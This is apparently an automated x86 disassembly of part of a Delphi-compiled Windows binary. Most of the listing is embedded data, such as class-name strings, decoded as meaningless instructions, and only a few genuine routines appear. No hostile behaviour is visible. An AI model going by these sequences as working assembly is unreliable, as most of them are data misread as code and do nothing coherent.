inc esp
inc ebx
push 0x656b6365
or [ fs : ecx + 0x44 ] ecx
pop es
inc ebx
push 0x656b6365
inc ebp
js r-xdata
or [ 0x63634154 ] dl
outsd
jb r-xdata
add cl [ eax ]
pop es
inc ecx
push ebx
outsb
jb r-xdata
jb r-xdata
outsd
jb r-xdata
jb r-xdata
add al 0x8
pop es
inc ecx
push ebx
outsb
jb r-xdata
add [ fs : ebx ] al
or [ edi ] al
inc ecx
push ebx
outsb
jb r-xdata
arpl [ gs : ebx + 0x65 ] bp
arpl [ ebp + 0x74 ] si
add [ gs : ebx ] al
or [ edi ] al
inc ecx
push ebx
outsb
jb r-xdata
jb r-xdata
inc esi
outsd
jb r-xdata
add [ eax + edx * 2 ] al
inc ecx
je r-xdata
or cl [ edx ]
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edx + ecx + 0xa ] si
or cl [ edx ]
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edx + ecx + 0xa ] si
inc ecx
lea eax [ eax ]
add [ ebx + 0x48 ] ah
add [ eax ] cl
sbb edx [ ecx + eax * 2 + 0x63 ]
arpl [ ebp + 0x73 ] sp
jae r-xdata
outsb
jb r-xdata
or cl [ edx ]
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edx + ecx + 0xa ] si
add [ esi ] al
push edx
popad
jae r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
outsb
dec ebp
outsd
inc eax
add [ eax + edx + 0x40 ] dl
add [ eax + r-xdata ] dl
or [ 0x63634154 ] dl
inc edx
outsd
outsd
insb
add [ 0x6e756f43 ] al
popad
or [ gs : bx + 0x6f ] dl
push 0x65
jb r-xdata
jae r-xdata
xchg esp eax
adc [ eax ] eax
in al 0x11
ja r-xdata
dec ecx
outsb
je r-xdata
ja r-xdata
push esp
arpl [ eax ] cx
add ecx [ eax ]
pop es
inc ecx
push ebx
outsb
jb r-xdata
push edx
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec eax
outsb
pop es
dec ecx
outsb
je r-xdata
arpl [ eax + eax + 0x6 ] si
push edi
push 0x6c6565
add ecx [ eax ]
pop es
inc ecx
push ebx
outsb
jb r-xdata
mov al 0x34
inc eax
add [ esp + esi + 0x31ec0040 ] ah
inc eax
add [ eax ] cl
xor al [ eax ]
in al dx
inc esi
outsd
jb r-xdata
add [ ecx + edx + 0x10dc0040 ] dl
jne r-xdata
popad
jns r-xdata
inc eax
add [ ebx + 0x4863a4c0 ] cl
add [ eax ] cl
adc eax 0x63634154
bound ebp [ edx + 0x65 ]
arpl [ ecx + ecx + 0x49 ] si
inc esp
imul esi [ ebx + 0x70 ] 0x68637461
add [ ecx + edx + 0x11e40040 ] dl
or [ esi ] dl
push esp
inc ecx
arpl [ ebx + 0x65 ] sp
jae r-xdata
bound ebp [ edx + 0x65 ]
arpl [ ecx + ecx + 0x49 ] si
inc esp
imul esi [ ebx + 0x70 ] 0x68637461
add [ ecx + edx + 0x11e40040 ] dl
inc eax
add [ eax + r-xdata ] dl
jae r-xdata
jb r-xdata
jb r-xdata
push edi
outsd
push eax
inc esi
or cl [ edx ]
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edx + ecx + 0xa ] si
bound ebp [ edx + 0x65 ]
arpl [ ecx + ecx + 0x49 ] si
inc esp
imul esi [ ebx + 0x70 ] 0x68637461
or cl [ ebx ]
arpl [ eax + 0x61 ] bp
jb r-xdata
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] bh
push ebp
add [ eax ] ah
add al [ eax ]
add [ ebx ] cl
push esp
inc ecx
arpl [ ebx + 0x65 ] sp
jae r-xdata
add [ esp + ebp * 4 + 0x33c0041 ] ch
inc edx
add al cl
stosd [ edi ]
inc ecx
add [ edx + ebp * 4 ] dh
add [ edx + eax ] ah
add [ eax ] al
nop
movsd [ edi ] [ esi ]
inc edi
add [ edi + eax ] dh
inc eax
dec eax
jb r-xdata
arpl [ eax + eax + 0x4 ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
jb r-xdata
inc edx
add [ eax - 0x5bffbfcc ] dh
xor al 0x40
add ah ch
xor [ eax ] eax
or [ edx ] dh
inc eax
add ah ch
inc esp
popad
je r-xdata
outsb
je r-xdata
inc esi
outsd
jb r-xdata
jne r-xdata
inc eax
add [ eax + edx + 0x40 ] dl
add [ ebp + 0x64000040 ] cl
dec eax
add [ eax ] cl
adc eax 0x63634154
jae r-xdata
xchg esp eax
adc [ eax ] eax
fcom [ eax ]
jb r-xdata
ja r-xdata
popad
je r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + ecx + 0x49 ] si
dec eax
add [ eax ] ah
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
outsd
jb r-xdata
xchg esp eax
adc [ eax ] eax
push esp
adc [ eax ] al
nop
dec eax
dec eax
add [ eax ] cl
adc eax 0x63634154
inc edx
add [ eax - 0x77ffbfcc ] ch
add [ edx ] al
inc ebx
push 0x65676e61
add [ edx ] al
or [ edi ] al
inc ecx
push ebx
outsb
jb r-xdata
inc edi
add al ah
add al [ edx ]
xor al 0xaa
jb r-xdata
pop es
dec ecx
jb r-xdata
push esi
imul esp [ ebp + 0x77 ] 0x6e616843
add [ gs : bp + si ] al
or [ edi ] al
inc ecx
push ebx
outsb
outsd
jne r-xdata
add [ edx ] al
or [ edi ] al
inc ecx
push ebx
outsb
jb r-xdata
jb r-xdata
popad
insb
push edx
outsb
bound ebp [ edx + 0x65 ]
arpl [ ecx + ecx + 0x49 ] si
inc esp
imul esi [ ebx + 0x70 ] 0x68637461
or cl [ ebx ]
arpl [ eax + 0x61 ] bp
jb r-xdata
push 0x68630b0a
popad
add [ eax ] al
add [ eax ] al
dec ecx
outsb
jae r-xdata
adc [ esi + 0x48 ] 0x0
pushad
add [ eax ] al
jmp [ eax ]
mov eax eax
inc eax
dec eax
add [ edi ] al
or edx [ ecx + eax * 2 + 0x63 ]
arpl [ ebp + 0x73 ] sp
jae r-xdata
add [ esi ] al
push edx
popad
jae r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x6 ] si
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] ch
dec eax
xchg esp eax
adc [ eax ] eax
push esp
adc [ eax ] al
nop
fsub [ eax + ecx * 2 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb al 0x65
dec eax
add [ eax + 0x65 ] al
dec eax
je r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + ecx + 0x49 ] si
inc esp
imul esi [ ebx + 0x70 ] 0x68637461
add [ ecx + edx + 0x11e40040 ] dl
inc eax
add ah ah
adc [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or eax 0x6e4f1100
jb r-xdata
add [ eax - 0x80000000 ] al
or al [ eax ]
or eax 0x66416e4f
je r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090006 ] al
outsb
inc ebx
jne r-xdata
outsd
jb r-xdata
loopne r-xdata
outsb
add [ eax + 0x4f080010 ] al
outsb
push ebp
outsb
insb
outsd
popad
in al 0x7c
inc ecx
add [ eax - 0x4f010000 ] dh
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070011 ] al
outsb
inc ebx
jb r-xdata
inc ecx
les edx [ edi + 0x48 ]
jo r-xdata
in al 0x7c
inc ecx
inc edx
outsw
jb r-xdata
jb r-xdata
add [ eax ] 0x0
add [ eax + 0x4f0e0007 ] al
outsb
inc edx
outsw
jb r-xdata
fsub [ eax + ecx * 2 ]
inc eax
cmpsb [ esi ] [ edi ]
inc edi
add [ edi ] bh
add [ eax ] cl
inc ecx
arpl [ ebx + 0x65 ] sp
jae r-xdata
and al 0x4
inc edx
add [ eax + 0x74c0042 ] bl
inc edx
add [ esp + eax ] dh
inc edx
add [ esp + eax ] ch
inc edx
add [ esp + ebp * 4 ] dl
inc edi
add [ edx + esi * 2 + 0x72080048 ] dh
dec eax
add [ edx + ebp * 4 + 0x47 ] bl
add [ ebx + esi * 2 ] dl
dec eax
add [ edx + esi * 2 ] dl
dec eax
add [ edx + esi * 2 + 0xe0048 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
cmp [ ebp + 0x48 ] dl
inc edx
add [ esp + eax ] ah
add [ edx ] cl
dec edi
in al 0x7c
inc ecx
add [ eax - 0x47010000 ] bh
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0012 ] al
outsb
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
or [ edi + 0x6e ] cl
insb
inc ebx
outsd
outsb
imul si [ edx + 0x6d ] 0x5814
dec eax
add [ eax - 0x67010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06000e ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f11000d ] al
outsb
popad
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08000b ] al
outsb
jb r-xdata
add [ eax ] al
push ebp
jo r-xdata
add [ eax - 0x80000000 ] al
or [ eax ] eax
push cs
dec edi
outsb
je r-xdata
jl r-xdata
pop eax
push eax
cmp al [ eax ]
in al 0x7c
inc ecx
add [ eax ] dl
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060005 ] al
outsb
dec esp
outsd
popad
in al 0x7c
inc ecx
add [ eax ] bl
add bh bh
pop eax
add [ eax ] al
inc [ ecx ]
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
loopne r-xdata
outsd
arpl [ ebp + 0x73 ] si
in al 0x7c
inc ecx
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0015 ] al
outsb
dec esp
outsd
jae r-xdata
add [ ebx ] cl
dec edi
in al 0x7c
popad
je r-xdata
jpe r-xdata
insb
outsd
jae r-xdata
push edx
jae r-xdata
outsb
in al 0x7c
inc ecx
add [ eax - 0x5f010000 ] ah
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08000f ] al
je r-xdata
add [ eax ] al
or [ 0x6e4f1100 ] 0x41
sbb [ edi + 0x48 ] dl
add [ eax - 0x7f010000 ] al
add [ eax ] al
inc [ ecx ]
outsb
dec edi
jo r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push cs
add [ esi ] al
dec edi
add [ eax + 0x4f12000c ] al
outsb
pop esp
push edi
dec eax
add [ eax - 0x77010000 ] cl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
dec edi
outsb
inc ecx
je r-xdata
outsb
jae r-xdata
outsb
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
str [ eax ]
dec edi
add [ eax - 0x6f010000 ] dl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
inc esp
insb
inc ebx
outsd
outsb
imul si [ edx + 0x6d ] 0x57c4
dec eax
popad
je r-xdata
dec eax
push esi
outsb
add [ eax ] ch
add bh bh
push 0x1ff0000
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d0008 ] al
outsb
inc ecx
je r-xdata
add bh bh
loopne r-xdata
dec eax
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0019 ] al
outsb
dec ebp
outsd
jne r-xdata
inc esi
outsd
arpl [ ebp + 0x73 ] si
in al 0x7c
inc ecx
add al bl
add [ eax ] al
pop es
dec edi
outsb
inc edi
outsd
je r-xdata
in al 0x7c
inc ecx
add al cl
add [ eax ] al
dec eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0014 ] al
inc ecx
add al al
add [ eax ] al
inc eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c0013 ] al
outsb
inc esp
popad
arpl [ ecx + ebp * 2 + 0x76 ] si
popad
je r-xdata
imul esi [ esi + 0x61 ] 0x7ce46574
pop eax
pop eax
dec eax
add [ eax - 0x57010000 ] ch
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
inc esp
insb
je r-xdata
add [ eax - 0x80000000 ] al
or eax [ eax ]
or [ edi + 0x6e ] cl
jb r-xdata
inc edx
outsw
jb r-xdata
adc cl [ edi + 0x6e ]
in al 0x7c
inc ecx
add [ eax ] bh
add bh bh
js r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop ss
add [ edx ] cl
dec edi
outsb
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe9476835
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0018 ] al
outsb
dec ebp
outsd
jne r-xdata
pop edx
dec eax
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
dec ebp
outsd
jbe r-xdata
int3
add bh bh
add [ eax ] eax
test al 0x5a
dec eax
add [ eax ] cl
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a001c ] al
outsb
inc esp
outsd
ja r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
and [ eax ] al
or [ edi + 0x6e ] cl
jo r-xdata
dec ebx
jns r-xdata
aam 0x59
dec eax
add al bh
add [ eax ] al
and [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop ds
add [ edi ] al
dec edi
outsb
push esp
imul ebp [ ebp + 0x65 ] 0x485ba472
jb r-xdata
pop esp
pop ecx
imul esi [ eax + edi + 0x5d ] 0x1500048
add bh bh
push eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f100025 ] al
outsb
inc edx
imul ebp [ gs : bp + 0x42 ] 0x68637461
inc ebp
imul esi [ fs : esp + eax * 4 + 0x5d ] 0x1580048
add bh bh
pop eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0f0026 ] al
outsb
push ebp
outsb
outsd
inc edx
popad
je r-xdata
insb
jns r-xdata
add [ eax ] eax
[ eax ]
pop ebx
dec eax
add [ eax ] bl
add [ eax ] eax
insd
jb r-xdata
jae r-xdata
jae r-xdata
push 0x74696445
rcr [ ebp + 0x48 ] 0x1
add [ eax + 0x1 ] ah
add bh bh
pushad
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f180027 ] al
outsb
inc edx
outsw
jb r-xdata
outsd
imul ebp [ esp + esi * 2 + 0x65 ] 0x485c6872
add [ eax ] bh
add [ eax ] eax
outsd
jb r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07001d ] al
outsb
dec ebx
jns r-xdata
add [ eax ] ch
pop ebx
dec eax
inc esi
imul ebp [ esp + esi * 2 + 0x65 ] 0x485c0472
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080020 ] al
outsb
push esp
jb r-xdata
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
pushfd
pop esi
dec eax
add [ eax + 0x1 ] dh
add bh bh
jo r-xdata
inc ebx
outsd
insd
insd
imul esi [ esp + edx * 2 + 0x72 ] 0x61736e61
arpl [ ecx + ebp * 2 + 0x6f ] si
inc edx
imul ebp [ gs : bp + 0x54 ] 0x736e6172
popad
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
inc eax
pop esi
dec eax
add [ eax + 0x1 ] ch
add bh bh
push 0x1ff0001
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f170028 ] al
outsb
inc ecx
je r-xdata
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07001e ] al
outsb
inc ebp
jb r-xdata
jl r-xdata
add [ eax ] eax
call [ eax + 0x1ff0001 ]
outsb
jae r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f190029 ] al
outsb
inc edx
outsw
jb r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] eax
sbb [ edi + 0x6e ] ecx
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f18002a ] al
outsb
inc ecx
je r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al [ eax ]
sbb [ edi + 0x6e ] cl
jb r-xdata
jb r-xdata
jb r-xdata
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f160032 ] al
outsb
inc ebx
outsd
insd
insd
popad
outsb
inc edx
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c002d ] al
outsb
inc esp
imul esi [ ebx + 0x63 ] 0x656e6e6f
arpl [ eax + eax * 8 + 0x5f ] si
dec eax
add [ eax - 0x6700ffff ] bl
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
nop
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
push 0x8000485f
add [ eax ] eax
inc [ eax + 0x1ff0001 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f15002b ] al
outsb
push edx
outsd
insb
insb
bound esp [ ecx + 0x63 ]
imul edx [ edx + esi * 2 + 0x61 ] 0x6e
jae r-xdata
je r-xdata
jb r-xdata
add [ eax ] eax
inc [ ecx ]
add [ eax - 0x7700ffff ] cl
outsd
insd
insd
imul esi [ esp + edx * 2 + 0x72 ] 0x61736e61
outsb
or al 0x5f
dec eax
add [ eax + 0x1 ] bh
add bh bh
js r-xdata
imul ebp [ gs : bp + 0x54 ] 0x736e6172
popad
add [ eax ] eax
push [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d0021 ] al
outsb
inc ecx
jo r-xdata
add [ eax ] dh
pop esp
dec eax
rol [ ecx ] 0x1
add bh bh
inc ebp
js r-xdata
outsw
jb r-xdata
in al 0x7c
inc ecx
add [ eax - 0x5700ffff ] ch
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d0030 ] al
outsb
inc edx
outsw
jb r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f12002e ] al
outsb
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
in al 0x7c
inc ecx
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09002c ] al
outsb
inc ebx
outsd
outsb
outsb
arpl [ gs : esp + 0x7c ] si
inc ecx
jl r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0038 ] al
arpl [ ebp + 0x74 ] si
in al 0x7c
inc ecx
add al bl
add [ eax ] eax
inc ebx
outsd
insd
insd
popad
outsb
inc ebp
js r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f100035 ] al
outsb
arpl [ ebp + 0x74 ] si
jl r-xdata
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
push ecx
jne r-xdata
push eax
imul esi [ esi + 0x6f ] 0x62615474
insb
inc ebx
push 0x65676e61
in al 0x7c
inc ecx
add [ eax - 0x5f00ffff ] ah
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07002f ] al
outsb
push ecx
jne r-xdata
add [ eax - 0x6f00ffff ] dl
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp eax [ eax ]
or eax 0x66416e4f
je r-xdata
push edx
outsb
jb r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor eax 0x6e4f1000
dec eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f100033 ] al
add bh bh
rol [ ecx ] 0x0
jb r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ edi + ecx * 2 ] cl
jb r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ ss : edi ] cl
dec edi
outsb
inc esp
popad
je r-xdata
bound ecx [ eax ]
[ eax ] eax
outsb
inc ebx
outsd
insd
insd
popad
outsb
inc ebx
push 0x656b6365
in al 0x60
dec eax
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f100034 ] al
outsb
inc ebx
outsd
insd
insd
popad
outsb
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
dec esp
popad
dec eax
add al dl
add [ eax ] eax
call eax
add [ eax ] eax
in al 0x7c
inc ecx
add [ eax - 0x4f00ffff ] dh
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f110031 ] al
outsb
push ebx
insb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
inc ebx
push 0x65676e61
adc [ eax + 0x48 ] ah
add [ eax - 0x4700ffff ] bh
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
jb r-xdata
inc ebx
push 0x65676e61
mov eax eax
ja r-xdata
popad
jns r-xdata
push eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d0039 ] al
outsb
inc ecx
je r-xdata
add al dh
add [ eax ] eax
push ebx
je r-xdata
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c003c ] al
outsb
dec ebp
outsd
jne r-xdata
jb r-xdata
dec edi
jb r-xdata
inc ecx
push ebx
outsb
jb r-xdata
jo r-xdata
outsb
outsb
inc esp
popad
push 0x65676e61
inc esp
je r-xdata
jne r-xdata
outsb
inc edx
outsw
jb r-xdata
add [ eax - 0x80000000 ] al
cmp [ eax ] al
push cs
dec edi
push 0x65676e61
pushfd
popad
dec eax
add al ah
add [ eax ] eax
jmp eax
outsb
jb r-xdata
dec eax
add [ eax ] bl
add al [ eax ]
[ eax ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c003e ] al
push edi
push 0xfc6c6565
arpl [ eax ] cx
adc [ edx ] al
add bh bh
adc [ edx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp eax 0x6e4f0c00
push esi
imul esp [ ebp + 0x77 ] 0x6e616843
inc esp
jb r-xdata
outsb
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + 0x55 ] ch
dec eax
add [ eax + 0xd000000 ] cl
push esp
inc ecx
arpl [ ebx + 0x65 ] sp
jae r-xdata
add [ esp + ebp * 4 + 0x33c0041 ] ch
add ecx [ eax ]
pop es
add [ edi ] eax
inc esp
popad
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x7 ] si
je r-xdata
jb r-xdata
and [ esi ] al
inc ebx
popad
outsb
arpl [ ebp + 0x6c ] sp
or [ ebx + 0x6d ] dl
popad
insb
insb
imul ebp [ esi + 0x74 ] 0x40119400
add [ eax + edx ] bh
inc eax
add [ esi + ebp * 2 + 0x12080048 ] ch
push esp
inc ecx
arpl [ ebx + 0x65 ] sp
jae r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + 0x6 ] si
push 0x800486e
adc [ ecx + eax * 2 + 0x63 ] edx
arpl [ ebp + 0x73 ] sp
jae r-xdata
mov eax eax
mov al [ 0x8004863 ]
add al [ eax ]
dec [ eax ]
jb r-xdata
bound ecx [ eax ]
clc
add [ eax ] eax
inc ecx
add [ eax ] ah
add bh bh
pushad
push edx
jo r-xdata
inc eax
cmpsb [ esi ] [ edi ]
add [ edx + ebp * 4 + 0x47 ] bl
add ah dl
jg r-xdata
or [ ebx + 0x6d ] dl
popad
insb
insb
imul ebp [ esi + 0x74 ] 0x40119400
add [ eax + edx ] bh
inc eax
add [ ebx + 0x486f9cc0 ] cl
insb
inc ebp
jb r-xdata
inc eax
add [ edi + ebp * 2 ] cl
or [ edx + 0x65 ] dl
outsd
outsb
jae r-xdata
dec edi
jo r-xdata
outsb
push edx
jo r-xdata
outsb
in al 0x7c
inc ecx
add [ eax ] ch
add bh bh
push 0x1ff0000
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c0008 ] al
outsb
jb r-xdata
outsb
add [ eax - 0x80000000 ] al
pop es
add [ edx ] cl
dec edi
push eax
pop es
add [ esi + ebp * 2 + 0x48 ] ah
add [ eax ] dl
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060005 ] al
outsb
dec edi
jo r-xdata
arpl [ ebx + 0x65 ] sp
jae r-xdata
add ah dl
jle r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax eax
pushfd
outsd
dec eax
jae r-xdata
or [ ebx + 0x6d ] dl
dec eax
add [ eax + eax - 0x5a700000 ] cl
inc edi
add [ edi + eax ] dh
inc edx
add [ eax - 0x77ffbfcc ] ch
add [ edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al

jo r-xdata
add al ah
outsd
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
loopne r-xdata
dec eax
add [ eax ] cl
adc edx [ ecx + eax * 2 + 0x63 ]
arpl [ ebp + 0x73 ] sp
jae r-xdata
or [ ebx + 0x6d ] dl
popad
insb
insb
imul ebp [ esi + 0x74 ] 0x40119400
add [ eax + edx ] bh
inc eax
add [ eax + edx ] bh
inc eax
add [ ebp + 0x6f0c0040 ] cl
popad
insb
insb
imul ebp [ esi + 0x74 ] 0x65520820
add [ edx ] al
or [ edi ] al
inc ecx
push ebx
outsb
inc ebx
popad
outsb
arpl [ ebp + 0x6c ] sp
and [ esi ] al
push esp
jb r-xdata
call sub_405a4c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x4 ]
call sub_405a08
retn
in al 0x7c
inc ecx
add [ eax - 0x7f010000 ] al
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06000b ] al
outsb
push eax
popad
lea eax [ bx + si ]
mov edx rw-data
mov [ eax + 0x30 ] edx
retn
lea eax [ eax ]
test al 0x6e
dec eax
add [ eax ] dh
add bh bh
jo r-xdata
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0007 ] al
add al 0x70
dec eax
add [ edi ] al
or eax 0x63634154
jae r-xdata
inc esp
popad
arpl [ ecx + ebp * 2 + 0x76 ] si
popad
je r-xdata
outsb
in al 0x7c
inc ecx
add [ eax ] bl
add bh bh
pop eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070006 ] al
outsb
inc ebx
insb
outsd
jae r-xdata
[ eax ]
pop eax
jae r-xdata
add [ edi + edi * 2 + 0x48 ] cl
add [ esi ] cl
add [ eax ] al
mov al 0x34
inc eax
jb r-xdata
jle r-xdata
dec eax
